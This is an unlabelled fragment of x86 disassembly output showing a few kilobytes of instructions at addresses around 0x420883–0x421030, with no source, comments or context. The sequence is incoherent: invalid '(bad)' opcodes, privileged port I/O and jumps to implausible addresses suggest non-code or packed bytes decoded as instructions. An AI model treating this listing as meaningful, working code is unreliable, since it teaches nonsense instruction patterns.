  420883:	sbb    al,0xfa
  420885:	mov    al,ds:0x68dc760e
  42088a:	sub    BYTE PTR [ebp+edx*8-0xa],bh
  42088e:	das    
  42088f:	retf   0xcd52
  420892:	add    BYTE PTR [edi-0x3c],cl
  420895:	xor    dl,dh
  420897:	out    0x2b,eax
  420899:	xor    dl,BYTE PTR [edx+edi*2]
  42089c:	scas   eax,DWORD PTR es:[edi]
  42089d:	add    BYTE PTR [ecx],bl
  42089f:	mov    dh,0x9e
  4208a1:	icebp  
  4208a2:	inc    esp
  4208a3:	hlt    
  4208a4:	sbb    BYTE PTR [eax+0x7d],ch
  4208a7:	sbb    al,0x9b
  4208a9:	push   esp
  4208aa:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  4208ac:	inc    esp
  4208ad:	jb     0x4208bb
  4208af:	(bad)  
  4208b0:	hlt    
  4208b1:	ret    
  4208b2:	sbb    cl,cl
  4208b4:	xor    ebp,ecx
  4208b6:	shr    bl,cl
  4208b8:	adc    eax,DWORD PTR [edi]
  4208ba:	push   es
  4208bb:	fdiv   st,st(6)
  4208bd:	js     0x420921
  4208bf:	dec    esp
  4208c0:	sti    
  4208c1:	sbb    BYTE PTR [edi],0x23
  4208c4:	stos   DWORD PTR es:[edi],eax
  4208c5:	into   
  4208c6:	mov    eax,0x1519cc13
  4208cb:	dec    ecx
  4208cc:	hlt    
  4208cd:	retf   0xf324
  4208d0:	jno    0x4208ad
  4208d2:	sub    ah,0x44
  4208d5:	push   ds
  4208d6:	adc    al,0x37
  4208d8:	mov    ds:0xd103e9e6,eax
  4208dd:	mov    ebx,DWORD PTR [ebx+eax*1+0xbc07f1c]
  4208e4:	sbb    al,BYTE PTR [edx+0x4b]
  4208e7:	ins    DWORD PTR es:[edi],dx
  4208e8:	push   cs
  4208e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4208ea:	call   0x1f058296
  4208ef:	sub    ah,dh
  4208f1:	aam    0xb1
  4208f3:	pop    edx
  4208f4:	(bad)  
  4208f5:	fisubr DWORD PTR [eax+0x6]
  4208f8:	inc    eax
  4208fa:	mov    WORD PTR [eax+0x3d],?
  4208fd:	jbe    0x420958
  4208ff:	mov    DWORD PTR [ecx+0x77f8a79f],esp
  420905:	in     al,0x1a
  420907:	xchg   ebp,eax
  420908:	mov    ah,BYTE PTR [ecx+0x516b0b3]
  42090e:	mov    bh,BYTE PTR [esi-0x7e]
  420911:	jne    0x4208cc
  420913:	jne    0x420942
  420915:	mov    eax,0xe0ac031c
  42091a:	(bad)  
  42091b:	loope  0x42099a
  42091d:	pushf  
  42091e:	repnz repz addr16 mov al,0xf7
  420923:	pop    ecx
  420924:	jne    0x42099e
  420926:	or     al,BYTE PTR [ecx+0x15b92e68]
  42092c:	inc    eax
  42092d:	inc    edx
  42092e:	popf   
  42092f:	cmp    eax,DWORD PTR es:[eax+0x0]
  420933:	mov    al,0x6c
  420935:	push   ds
  420936:	push   es
  420937:	xchg   edi,eax
  420938:	jae    0x420992
  42093a:	fidiv  WORD PTR [edi]
  42093c:	hlt    
  42093d:	jnp    0x4208eb
  42093f:	push   cs
  420940:	xor    al,ch
  420942:	lods   eax,DWORD PTR ds:[esi]
  420943:	adc    al,0xdf
  420945:	push   0x6e722e21
  42094a:	sbb    BYTE PTR [esi-0x45c3c695],0xf3
  420951:	push   0x948915bf
  420956:	add    eax,0x9c3e65f
  42095b:	stc    
  42095c:	int3   
  42095d:	test   eax,0xf5585a43
  420962:	scas   al,BYTE PTR es:[edi]
  420963:	xchg   edi,eax
  420964:	retf   0x5d9
  420967:	inc    ebx
  420968:	inc    ebx
  420969:	cmp    BYTE PTR [ebx+ebx*4-0x15aa4fa8],bl
  420970:	cld    
  420971:	mov    esp,0x9b9c9167
  420976:	cmp    edi,DWORD PTR [ebx+edi*1-0x51414e08]
  42097d:	mov    ebp,0xac9c10af
  420982:	arpl   WORD PTR [esi+0x32],bp
  420985:	push   esi
  420986:	mov    edi,0x795740fb
  42098b:	cmp    eax,0xc83e801
  420990:	hlt    
  420991:	outs   dx,DWORD PTR ds:[esi]
  420992:	data16 add al,0x27
  420995:	ins    DWORD PTR es:[edi],dx
  420996:	and    DWORD PTR ds:0xca77927,esi
  42099c:	popa   
  42099d:	adc    eax,0xea3453f5
  4209a2:	rol    DWORD PTR [ecx+0x10],cl
  4209a5:	mov    ebp,0x41d4f6a5
  4209aa:	xor    BYTE PTR [esi+0x17],dl
  4209ad:	inc    ebp
  4209ae:	pop    ebx
  4209af:	fimul  DWORD PTR [esp+edi*1]
  4209b2:	adc    DWORD PTR [ebp-0x31969cbe],esi
  4209b8:	icebp  
  4209b9:	fild   QWORD PTR ds:0x9b651b36
  4209bf:	mov    dh,cl
  4209c1:	sub    cl,BYTE PTR [eax+edx*8-0x2a2b3b48]
  4209c8:	lds    eax,FWORD PTR [edi-0x4745e914]
  4209ce:	mov    ah,0x4f
  4209d0:	adc    ch,bh
  4209d2:	push   esi
  4209d3:	mov    bh,0xc8
  4209d5:	sbb    eax,0xfd45e32e
  4209da:	jns    0x420a51
  4209dc:	ja     0x4209e7
  4209de:	dec    edi
  4209df:	fs jecxz 0x420a36
  4209e2:	(bad)  
  4209e3:	pop    esp
  4209e4:	lock push esp
  4209e6:	add    eax,0xdc98cc4c
  4209eb:	repnz das 
  4209ed:	or     DWORD PTR [ecx],esp
  4209ef:	int3   
  4209f0:	dec    edi
  4209f1:	call   0x6d459187
  4209f6:	or     edi,ecx
  4209f8:	mov    esp,0xe17932fe
  4209fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209fe:	jne    0x4209f5
  420a00:	jno    0x420a5a
  420a02:	sbb    bl,cl
  420a04:	mov    eax,ds:0xac2ea682
  420a09:	jge    0x42098b
  420a0b:	mov    esp,0x38e7a163
  420a10:	and    edx,ecx
  420a12:	jne    0x420a27
  420a14:	push   esi
  420a15:	ins    BYTE PTR es:[edi],dx
  420a16:	pop    es
  420a17:	stc    
  420a18:	retf   0xe44c
  420a1b:	int    0x67
  420a1d:	leave  
  420a1e:	pop    ebx
  420a1f:	add    cl,BYTE PTR [ecx+eax*1+0x4d8b944e]
  420a26:	fxch   st(0)
  420a28:	sub    bl,BYTE PTR [ecx+0x35a81b99]
  420a2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a2f:	ins    DWORD PTR es:[edi],dx
  420a30:	test   al,0xc6
  420a32:	push   esp
  420a33:	clc    
  420a34:	lds    edi,FWORD PTR ds:0x39651a01
  420a3a:	mov    fs,WORD PTR es:[ecx-0x65]
  420a3e:	and    DWORD PTR ds:0xe5013523,esp
  420a44:	aad    0xfb
  420a46:	add    BYTE PTR [edx-0x1253a25],bl
  420a4c:	dec    edx
  420a4d:	inc    edi
  420a4e:	icebp  
  420a4f:	xchg   esp,eax
  420a50:	lahf   
  420a51:	add    bl,0x83
  420a54:	xchg   esi,eax
  420a55:	(bad)
  420a58:	jo     0x420a5e
  420a5a:	stc    
  420a5b:	call   0x18e9:0xabfff6c
  420a62:	mov    ch,0x7e
  420a64:	gs das 
  420a66:	pop    ebx
  420a67:	sbb    ecx,ebp
  420a69:	mov    dl,0xc3
  420a6b:	aas    
  420a6c:	xchg   ah,cl
  420a6e:	fnstsw WORD PTR [ebx]
  420a70:	data16 adc al,0x2d
  420a73:	mov    ds:0xd9c604ee,al
  420a78:	scas   eax,DWORD PTR es:[edi]
  420a79:	in     eax,dx
  420a7a:	mov    bl,al
  420a7c:	push   ecx
  420a7d:	sub    BYTE PTR [ebx-0x791b55a],ah
  420a83:	aas    
  420a84:	push   esp
  420a85:	stc    
  420a86:	into   
  420a87:	mov    WORD PTR [ecx+0x10479878],?
  420a8d:	xor    esp,esp
  420a8f:	rcl    bh,cl
  420a91:	test   DWORD PTR [ebx-0x5d712c85],eax
  420a97:	in     al,dx
  420a98:	pusha  
  420a99:	cmp    al,0xce
  420a9b:	push   edx
  420a9c:	js     0x420aea
  420a9e:	bound  ebp,QWORD PTR [edx-0x6f]
  420aa1:	in     eax,0x90
  420aa3:	data16 adc cl,dl
  420aa6:	data16 or BYTE PTR [ebx],al
  420aa9:	or     al,0xef
  420aab:	or     al,0xc6
  420aad:	mov    bh,0x12
  420aaf:	mov    ?,esp
  420ab1:	mov    ebp,0x1000a264
  420ab6:	shl    DWORD PTR [edi+0x4e],0x3b
  420aba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420abb:	dec    esi
  420abc:	cs push ds
  420abe:	sbb    eax,DWORD PTR [edi-0x18]
  420ac1:	sbb    al,BYTE PTR [eax]
  420ac3:	je     0x420ad7
  420ac5:	push   esp
  420ac6:	jmp    FWORD PTR [esp+ecx*4-0x686f229f]
  420acd:	add    DWORD PTR [ebx+0x4bb2310],ebp
  420ad3:	sbb    dl,BYTE PTR [edi-0x14]
  420ad6:	lods   al,BYTE PTR ds:[esi]
  420ad7:	pop    edi
  420ad8:	in     al,0x9c
  420ada:	add    al,0x2d
  420adc:	jg     0x420a8a
  420ade:	or     DWORD PTR [ecx-0x31],ecx
  420ae1:	xchg   edx,ebx
  420ae3:	aaa    
  420ae4:	mov    ebp,0x112ede7
  420ae9:	push   cs
  420aea:	ins    DWORD PTR es:[edi],dx
  420aeb:	mov    BYTE PTR [ecx-0x72],bh
  420aee:	adc    DWORD PTR [edi+0x1c3dc117],eax
  420af4:	fwait
  420af5:	inc    edi
  420af6:	mov    fs,WORD PTR [edx+0x76b5208f]
  420afc:	jne    0x420aa6
  420afe:	pop    eax
  420aff:	jmp    0x36f5be2e
  420b04:	mov    edx,0x99fc373a
  420b09:	adc    eax,0x381bf944
  420b0e:	sti    
  420b0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b10:	mov    bl,BYTE PTR [esi]
  420b12:	ja     0x420aac
  420b14:	jae    0x420b6f
  420b16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b17:	mov    al,0x48
  420b19:	or     al,0xcf
  420b1b:	out    0xbe,eax
  420b1d:	sbb    dl,BYTE PTR [edx+0x4d30c687]
  420b23:	fdivr  DWORD PTR [ebx-0x24]
  420b26:	test   eax,0x1706ba8
  420b2b:	sbb    al,BYTE PTR [ecx+0x7e]
  420b2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b2f:	(bad)  
  420b30:	js     0xecc446a
  420b36:	mov    ecx,0xe522bba3
  420b3b:	jl     0x420b08
  420b3d:	lods   eax,DWORD PTR ds:[esi]
  420b3e:	daa    
  420b3f:	mov    al,0xd7
  420b41:	sub    BYTE PTR [ecx+edi*2-0x673b0c7e],0x22
  420b49:	push   ss
  420b4a:	jnp    0x420bbc
  420b4c:	ins    BYTE PTR es:[edi],dx
  420b4d:	loopne 0x420ad6
  420b4f:	rcl    DWORD PTR [eax+ecx*8],0x79
  420b53:	sbb    dl,bl
  420b55:	adc    BYTE PTR [eax-0xc],0xaa
  420b59:	xor    BYTE PTR [esi],dl
  420b5b:	xor    dl,BYTE PTR [eax]
  420b5d:	rcr    DWORD PTR [eax-0x30c02497],0x1a
  420b64:	mov    ah,0x6b
  420b66:	loopne 0x420b6c
  420b68:	xor    DWORD PTR [ecx],ebx
  420b6a:	test   al,0x97
  420b6c:	test   DWORD PTR [ebx+edi*1],0xf599a812
  420b73:	pop    esi
  420b74:	pop    ebp
  420b75:	mov    dl,0x49
  420b77:	shl    BYTE PTR [ebx-0x40],1
  420b7a:	mul    BYTE PTR [esp+ecx*1-0x7c5ed4b]
  420b81:	sbb    BYTE PTR [edi],dl
  420b83:	push   edx
  420b84:	add    BYTE PTR [esi-0x7e],bh
  420b87:	and    DWORD PTR [ecx-0x6140f499],ebx
  420b8d:	aam    0xa6
  420b8f:	sbb    eax,0xe105bf33
  420b94:	ds xchg ecx,ebp
  420b97:	int3   
  420b98:	mov    DWORD PTR [edx+eiz*4],ebx
  420b9b:	cmp    ecx,esp
  420b9d:	cmp    BYTE PTR [edi+0x3203151c],bh
  420ba3:	pop    ebx
  420ba4:	das    
  420ba5:	out    dx,al
  420ba6:	push   0xf80481ca
  420bab:	mov    edi,0x75356f8d
  420bb0:	jmp    0x420b45
  420bb2:	push   edx
  420bb3:	jp     0x420b62
  420bb5:	and    ah,ah
  420bb7:	pusha  
  420bb8:	addr16 inc edx
  420bba:	jmp    0x41b095c0
  420bbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420bc0:	sub    DWORD PTR [ecx],edi
  420bc2:	xor    esi,edi
  420bc4:	ss fdivr st,st(1)
  420bc7:	call   0x267d:0xdbbaec28
  420bce:	mov    dl,0x23
  420bd0:	retf   
  420bd1:	leave  
  420bd2:	cld    
  420bd3:	push   0x21
  420bd5:	jp     0x420bad
  420bd7:	test   eax,0x73e62697
  420bdc:	call   0x851f425b
  420be1:	bound  ebp,QWORD PTR [ecx+0x46f7a2f1]
  420be7:	push   esi
  420be8:	fnstsw WORD PTR [esi-0x15]
  420beb:	dec    ebx
  420bec:	enter  0x3ede,0x91
  420bf0:	adc    DWORD PTR [ecx],esp
  420bf2:	sub    ch,BYTE PTR [eax+0x32]
  420bf5:	xchg   ebp,eax
  420bf6:	ret    0x9a73
  420bf9:	jo     0x420bc6
  420bfb:	loopne 0x420c6f
  420bfd:	push   edi
  420bfe:	(bad)  
  420bff:	data16 arpl sp,bx
  420c02:	mov    edx,0xa17c531c
  420c07:	cmp    BYTE PTR [ecx],ch
  420c09:	sbb    al,0x10
  420c0b:	mov    esi,0xfc409349
  420c10:	jo     0x420c3f
  420c12:	cmp    eax,0xf50762ef
  420c17:	cmp    BYTE PTR [eax-0x78082231],ah
  420c1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c1e:	pop    esp
  420c1f:	fcmovne st,st(7)
  420c21:	mov    eax,ds:0x4465a51c
  420c26:	jg     0x420c1c
  420c28:	dec    ecx
  420c29:	adc    BYTE PTR ds:0xd3a013af,bl
  420c2f:	mov    al,0xe4
  420c31:	outs   dx,BYTE PTR ds:[esi]
  420c32:	jno    0x420c49
  420c34:	shl    DWORD PTR [esi+0x5f],1
  420c37:	push   eax
  420c38:	(bad)  
  420c39:	sbb    dh,BYTE PTR [eax+eiz*4+0x1]
  420c3d:	mov    esi,0xb6e6881a
  420c42:	jecxz  0x420c69
  420c44:	sar    edx,1
  420c46:	adc    ebx,DWORD PTR [esi+0x21707d7d]
  420c4c:	push   edi
  420c4d:	mov    eax,0x61f42b8a
  420c52:	xor    al,BYTE PTR [eax]
  420c54:	push   es
  420c55:	jmp    0xc9ba4c3c
  420c5a:	push   ebp
  420c5b:	retf   
  420c5c:	cs jae 0x420c88
  420c5f:	rol    BYTE PTR ds:0xee9947ef,1
  420c65:	adc    ebx,esi
  420c67:	adc    ebp,DWORD PTR ds:0x2e95475d
  420c6d:	imul   ebx,ebx,0x5e
  420c70:	xchg   ebp,eax
  420c71:	sub    al,0xd9
  420c73:	fmulp  st(1),st
  420c75:	test   eax,0xa03c4dac
  420c7a:	inc    ecx
  420c7b:	into   
  420c7c:	fld    TBYTE PTR [ecx]
  420c7e:	gs push 0xaffb9b4c
  420c84:	jmp    0x2530ab51
  420c89:	ins    DWORD PTR es:[edi],dx
  420c8a:	fs jne 0x420ce5
  420c8d:	adc    al,0x41
  420c8f:	daa    
  420c90:	sar    BYTE PTR [ebx+0x37],cl
  420c93:	cli    
  420c94:	into   
  420c95:	mov    bh,0xb3
  420c97:	test   BYTE PTR [ebp+0x69],0xf5
  420c9b:	mov    ?,eax
  420c9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c9e:	or     eax,0xd733ae2
  420ca3:	scas   al,BYTE PTR es:[edi]
  420ca4:	xchg   edx,eax
  420ca5:	xchg   edx,eax
  420ca6:	jmp    0xaf8b5a9c
  420cab:	leave  
  420cac:	cwde   
  420cad:	ss mov bh,0x3a
  420cb0:	or     eax,0xed65bc21
  420cb5:	aam    0xff
  420cb7:	add    ebx,DWORD PTR [ecx+0xc]
  420cba:	or     eax,0x4a
  420cbd:	cdq    
  420cbe:	mov    esi,0x39663812
  420cc3:	push   es
  420cc4:	imul   ebp,DWORD PTR [esi],0x1cfa993c
  420cca:	pushf  
  420ccb:	lea    esi,[esi-0x77]
  420cce:	rcl    edi,cl
  420cd0:	imul   edi,DWORD PTR [edx+eiz*4],0xffffffbc
  420cd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420cd5:	ss dec ebx
  420cd7:	jge    0x420d21
  420cd9:	push   ss
  420cda:	mov    ds:0x6e7f9b29,eax
  420cdf:	pop    es
  420ce0:	test   BYTE PTR [ebx],ch
  420ce2:	sar    ah,cl
  420ce4:	loop   0x420d5a
  420ce6:	out    0x2d,al
  420ce8:	push   ebx
  420ce9:	cmp    esi,DWORD PTR [esi-0x59]
  420cec:	shr    eax,1
  420cee:	les    edi,FWORD PTR [eax+0x5f]
  420cf1:	fs daa 
  420cf3:	push   ebx
  420cf4:	push   eax
  420cf5:	pop    es
  420cf6:	xor    DWORD PTR [edi+0x1d],esi
  420cf9:	nop
  420cfa:	test   al,0x2b
  420cfc:	out    0xe5,eax
  420cfe:	xchg   edx,eax
  420cff:	out    dx,eax
  420d00:	arpl   WORD PTR [esp+edi*2],ax
  420d03:	pop    ds
  420d04:	not    DWORD PTR [esi-0x64e08db]
  420d0a:	sahf   
  420d0b:	pop    ds
  420d0c:	jp     0x420d09
  420d0e:	cmp    DWORD PTR [edi-0x7],ebp
  420d11:	mov    edx,0xd53330fc
  420d16:	aaa    
  420d17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d18:	push   0xffffff90
  420d1a:	mov    ch,0x36
  420d1c:	call   0xe4d6:0x93296930
  420d23:	shl    DWORD PTR [ecx-0x2e797163],0x9c
  420d2a:	cmp    eax,0xc0e8c963
  420d2f:	xor    DWORD PTR [ebx+edx*4],ecx
  420d32:	mov    esi,0x1b4e7e84
  420d37:	fimul  WORD PTR [esp-0x449323ce]
  420d3e:	pusha  
  420d3f:	inc    ecx
  420d40:	aaa    
  420d41:	outs   dx,DWORD PTR ds:[esi]
  420d42:	aas    
  420d43:	sahf   
  420d44:	jnp    0x420d5b
  420d46:	push   cs
  420d47:	push   edx
  420d48:	push   ss
  420d49:	mov    cl,0xcb
  420d4b:	mov    ah,0x63
  420d4d:	ds xchg esi,eax
  420d4f:	mov    ebx,0x4710568c
  420d54:	not    cl
  420d56:	push   cs
  420d57:	loope  0x420d66
  420d59:	add    eax,0x5c911b8d
  420d5e:	stos   BYTE PTR es:[edi],al
  420d5f:	adc    esp,DWORD PTR [ecx-0x70]
  420d62:	xor    eax,0xcb0d940e
  420d67:	jle    0xfa1889fe
  420d6d:	loop   0x420d5d
  420d6f:	pop    ebp
  420d70:	xlat   BYTE PTR ds:[ebx]
  420d71:	(bad)  
  420d72:	or     al,0x6f
  420d74:	sub    BYTE PTR [edx+eax*1+0x6f],al
  420d78:	and    BYTE PTR [edi+0x47],0xb6
  420d7c:	xor    eax,DWORD PTR [eax]
  420d7e:	mov    al,ds:0x959d5965
  420d83:	in     eax,0x28
  420d85:	in     eax,0xc5
  420d87:	fsub   DWORD PTR [edi+0x2b0f0063]
  420d8d:	shl    BYTE PTR [edx+0x282e1d35],1
  420d93:	in     eax,0xd3
  420d95:	or     al,0xfc
  420d97:	mov    esi,0x20778a03
  420d9c:	in     eax,dx
  420d9d:	adc    esp,DWORD PTR [ebx]
  420d9f:	ins    DWORD PTR es:[edi],dx
  420da0:	or     ebx,DWORD PTR [edi+0x68]
  420da3:	fisubr WORD PTR [eax+ebp*2-0x41]
  420da7:	repz clc 
  420da9:	in     eax,0x1f
  420dab:	xchg   DWORD PTR [esi+0x62],eax
  420dae:	push   eax
  420daf:	sbb    bl,BYTE PTR [ebx]
  420db1:	pop    eax
  420db2:	mov    eax,0xb862c045
  420db7:	lds    ebx,FWORD PTR [edx+0x70]
  420dba:	xchg   ebx,eax
  420dbb:	lahf   
  420dbc:	sub    DWORD PTR ds:0x3d0a27cb,edx
  420dc2:	and    cl,bl
  420dc4:	(bad)  
  420dc5:	not    DWORD PTR [esi+0x293cb531]
  420dcb:	shl    ch,cl
  420dcd:	clc    
  420dce:	sub    al,0x43
  420dd0:	mov    al,ds:0x95a02a01
  420dd5:	fcom   QWORD PTR [ecx]
  420dd7:	loopne 0x420e51
  420dd9:	stc    
  420dda:	mov    bl,0x29
  420ddc:	repz cmc 
  420dde:	cli    
  420ddf:	sub    bl,al
  420de1:	out    0x1d,al
  420de3:	add    dl,bl
  420de5:	jb     0x420d8c
  420de7:	sti    
  420de8:	pop    edx
  420de9:	and    al,0x9a
  420deb:	dec    ebx
  420dec:	xlat   BYTE PTR ds:[ebx]
  420ded:	jmp    0xb2df:0x6d3741f9
  420df4:	and    DWORD PTR [ecx-0x26],edx
  420df7:	retf   
  420df8:	pop    ss
  420df9:	imul   ebp,ecx,0x4f
  420dfc:	push   ebp
  420dfd:	adc    BYTE PTR [ecx-0x58],0xe1
  420e01:	fidiv  WORD PTR [ebx+0x1af6e6f1]
  420e07:	outs   dx,DWORD PTR ds:[esi]
  420e08:	dec    esi
  420e09:	enter  0x9507,0x59
  420e0d:	(bad)  
  420e0e:	iret   
  420e0f:	add    DWORD PTR [edi-0x7cf08082],ebp
  420e15:	mov    edi,0x5fe82278
  420e1a:	cmp    eax,0x7f39a8df
  420e1f:	sbb    eax,0x84664cd0
  420e24:	inc    ebx
  420e25:	retf   
  420e26:	in     al,dx
  420e27:	xlat   BYTE PTR ds:[ebx]
  420e28:	retf   0x6748
  420e2b:	dec    ebp
  420e2c:	aas    
  420e2d:	repnz xor eax,0xd3532623
  420e33:	dec    edx
  420e34:	adc    edi,esp
  420e36:	mov    edi,0x4bdbc6d0
  420e3b:	jg     0x420de8
  420e3d:	mov    ss,esi
  420e3f:	ins    BYTE PTR es:[edi],dx
  420e40:	cmp    esp,eax
  420e42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e43:	inc    esi
  420e44:	sub    eax,0xdb1c21
  420e49:	pop    es
  420e4a:	pop    esi
  420e4b:	xchg   esp,eax
  420e4c:	pop    ebp
  420e4d:	dec    edi
  420e4e:	xchg   ecx,eax
  420e4f:	pop    eax
  420e50:	cmp    BYTE PTR [eax],dh
  420e52:	xchg   BYTE PTR [esi+0x58],dh
  420e55:	retf   0xf00
  420e58:	(bad)  
  420e59:	gs dec ebx
  420e5b:	cmp    al,0xce
  420e5d:	xchg   ebp,eax
  420e5e:	add    BYTE PTR [edi-0x5bc5dc88],al
  420e64:	sti    
  420e65:	mov    ebx,0xa7d20cf5
  420e6a:	lock xor ebp,eax
  420e6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e6e:	pop    esp
  420e6f:	sub    eax,0xd87eec
  420e74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e75:	stos   BYTE PTR es:[edi],al
  420e76:	out    dx,eax
  420e77:	iret   
  420e78:	cdq    
  420e79:	add    eax,DWORD PTR [eax]
  420e7b:	fdivr  QWORD PTR [edi-0x8]
  420e7e:	lods   eax,DWORD PTR ds:[esi]
  420e7f:	loopne 0x420e74
  420e81:	call   0x6d6e32a
  420e86:	xchg   edi,eax
  420e87:	and    al,0x6e
  420e89:	xor    DWORD PTR [edi+ebp*8+0x6b],0x49
  420e8e:	cli    
  420e8f:	jp     0x420f0e
  420e91:	mov    eax,0xb0363738
  420e96:	adc    DWORD PTR [edx],eax
  420e98:	mov    ebx,0xed0b35e2
  420e9d:	sbb    eax,0xefc21cbe
  420ea2:	push   ecx
  420ea3:	in     al,0x9d
  420ea5:	outs   dx,DWORD PTR ds:[esi]
  420ea6:	mov    bh,0xc8
  420ea8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ea9:	jge    0x420f1c
  420eab:	ret    
  420eac:	pop    ecx
  420ead:	imul   BYTE PTR [edi]
  420eaf:	stos   BYTE PTR es:[edi],al
  420eb0:	jmp    0x75f4c812
  420eb5:	out    dx,al
  420eb6:	xor    dh,bl
  420eb8:	out    dx,eax
  420eb9:	mov    dl,0x6d
  420ebb:	sub    ebp,DWORD PTR [esi+edi*2]
  420ebe:	sub    BYTE PTR [eax+edi*2+0x1f0d3b0a],ah
  420ec5:	test   al,0xa7
  420ec7:	inc    ebp
  420ec8:	add    BYTE PTR [eax],al
  420eca:	push   ebp
  420ecb:	dec    eax
  420ecc:	inc    edx
  420ecd:	push   ebp
  420ece:	pop    edi
  420ecf:	pop    edi
  420ed0:	push   edi
  420ed1:	dec    eax
  420ed2:	cmp    BYTE PTR [esi-0x14],bh
  420ed5:	or     bl,BYTE PTR [edx-0x116266e0]
  420edb:	popf   
  420edc:	add    DWORD PTR [eax],eax
  420ede:	xchg   BYTE PTR [esi],al
  420ee0:	add    BYTE PTR [eax],al
  420ee2:	jl     0x420e8c
  420ee4:	fs jns 0x420efd
  420ee7:	push   esp
  420ee8:	jge    0x420e86
  420eea:	mov    dh,0x70
  420eec:	push   ecx
  420eed:	sub    bh,dl
  420eef:	ret    
  420ef0:	or     WORD PTR [edi-0x43541b93],cx
  420ef7:	sbb    al,ch
  420ef9:	ins    BYTE PTR es:[edi],dx
  420efa:	in     eax,0xc8
  420efc:	jns    0x420f1b
  420efe:	int3   
  420eff:	pop    eax
  420f00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f01:	pop    ebx
  420f02:	mov    al,0x7a
  420f04:	(bad)  
  420f05:	fmul   DWORD PTR [eax+eiz*4-0x40]
  420f09:	mov    ebp,0x6a126cec
  420f0e:	add    al,0x5b
  420f10:	lea    ebx,ss:[eax-0x16]
  420f14:	sbb    ch,ch
  420f16:	in     al,dx
  420f17:	mov    ds:0x17fb7ad5,al
  420f1c:	(bad)  
  420f1e:	pop    edx
  420f1f:	les    edx,FWORD PTR [edx+0x17]
  420f22:	ja     0x420eb0
  420f24:	ja     0x420f75
  420f26:	fsub   DWORD PTR [esi]
  420f28:	mov    ebx,0x430bd7d6
  420f2d:	mov    ebx,0x646fa2dc
  420f32:	sub    BYTE PTR [ecx+0xde7f537],0x92
  420f39:	jecxz  0x420f33
  420f3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f3c:	(bad)  
  420f3d:	jnp    0x420f78
  420f3f:	jmp    0x3935:0xb4f9d814
  420f46:	cs dec ebx
  420f48:	pusha  
  420f49:	push   edx
  420f4a:	mov    ebx,DWORD PTR [esi-0x7c]
  420f4d:	pop    esi
  420f4e:	mov    ebp,0xb4f86ee1
  420f53:	mov    ebp,0xda95c09c
  420f58:	xchg   DWORD PTR [esi+0x2a],esp
  420f5b:	shr    esp,cl
  420f5d:	vmwrite ebp,DWORD PTR [eax+0x17]
  420f61:	jns    0x420f5e
  420f63:	push   ebx
  420f64:	idiv   DWORD PTR [ecx]
  420f66:	xor    bh,BYTE PTR [eax+0x4e]
  420f69:	and    eax,0xdb3ca633
  420f6e:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  420f70:	sub    al,0xd1
  420f72:	call   0xfbb78556
  420f77:	lea    ebp,[ebx-0x74ab30f4]
  420f7d:	hlt    
  420f7e:	pop    ecx
  420f7f:	repz mov cl,0x89
  420f82:	push   eax
  420f83:	in     al,dx
  420f84:	ror    DWORD PTR [eax+0x7b174e0a],1
  420f8a:	ja     0x420f69
  420f8c:	icebp  
  420f8d:	ror    DWORD PTR [edi-0x612dd356],1
  420f93:	leave  
  420f94:	dec    ebx
  420f95:	xor    DWORD PTR [eax],0x6c076079
  420f9b:	mov    WORD PTR [eax+0x1d14c71f],?
  420fa1:	xor    DWORD PTR [edi],esp
  420fa3:	ins    DWORD PTR es:[edi],dx
  420fa4:	fxch   st(1)
  420fa6:	sub    al,0xb9
  420fa8:	jbe    0x420f81
  420faa:	lahf   
  420fab:	sar    ah,cl
  420fad:	and    DWORD PTR [ecx+ebx*1+0x72],edi
  420fb1:	xor    eax,0x7172d3d2
  420fb6:	xor    eax,0x461afea6
  420fbb:	(bad)  
  420fbc:	pop    edi
  420fbd:	(bad)  
  420fbe:	dec    ecx
  420fbf:	js     0x420fdd
  420fc1:	jne    0x421035
  420fc3:	xor    DWORD PTR [ecx+0x67338ec0],0x2
  420fca:	cs push ebx
  420fcc:	mov    ecx,0x1a830ca7
  420fd1:	xchg   ecx,eax
  420fd2:	xchg   ecx,eax
  420fd3:	adc    BYTE PTR [ebp+0x395aa233],al
  420fd9:	sti    
  420fda:	fstp   DWORD PTR ds:0x140345ab
  420fe0:	imul   ecx,DWORD PTR [edx-0x2153c98b],0xffffff8a
  420fe7:	push   cs
  420fe8:	sub    BYTE PTR [edi+0x3b2b40fc],cl
  420fee:	sti    
  420fef:	pushf  
  420ff0:	fs add al,0x8a
  420ff3:	sub    ch,BYTE PTR ds:0x9b81e378
  420ff9:	mov    dl,0x8b
  420ffb:	mov    ah,0xa3
  420ffd:	sub    edi,DWORD PTR [ebx+0x54]
  421000:	or     al,0x65
  421002:	mov    cl,0x12
  421004:	(bad)  
  421005:	pop    edi
  421006:	fmulp  st(3),st
  421008:	push   0x52
  42100a:	xchg   DWORD PTR [ecx+0x19b786e4],ebx
  421010:	pop    esi
  421011:	loopne 0x420ff6
  421013:	mov    al,ds:0xdc5f2d25
  421018:	mov    ah,ah
  42101a:	ins    DWORD PTR es:[edi],dx
  42101b:	add    ch,dh
  42101d:	or     esi,DWORD PTR [edi+0x44]
  421020:	repz mov ebx,0x2279be20
  421026:	inc    ebp
  421027:	out    0x2d,al
  421029:	test   DWORD PTR [esi-0x6950de41],ebx
  42102f:	stc    
  421030:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
